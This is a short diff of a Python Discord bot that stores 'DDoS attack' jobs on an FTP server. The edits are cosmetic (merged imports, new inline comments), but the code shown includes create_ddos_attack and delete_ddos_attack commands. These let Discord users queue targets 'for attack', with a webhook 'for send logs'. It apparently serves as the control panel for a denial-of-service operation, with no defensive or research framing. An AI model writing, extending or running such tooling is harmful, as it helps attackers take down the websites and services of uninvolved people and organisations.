@@ -2,17 +2,9 @@
 # ALL RIGHTS RESERVED
 #
 
-import io
-import discord
-import os
-import json
-import ftplib
-import dotenv
-dotenv.load_dotenv()
+import io, os, json, ftplib, dotenv, discord
 from discord.ext.commands import Bot, Context
-
-#connect bot with all intents
-
+dotenv.load_dotenv()
 
 #get jobs from ftp server and save variable jobs
 ftp = ftplib.FTP(os.getenv("ftp_host"))
@@ -76,8 +68,8 @@ async def create_ddos_attack(ctx : Context, target):
 
         #add target to jobs
         jobs.append({
-            "target": target,
-            "webhook": webhook.url
+            "target": target, #for attack
+            "webhook": webhook.url #for send logs
         })
 
         saveftp()
@@ -96,6 +88,3 @@ async def delete_ddos_attack(ctx : Context, target):
 
 
 bot.run(os.getenv('discord_token'))
-
-
-    
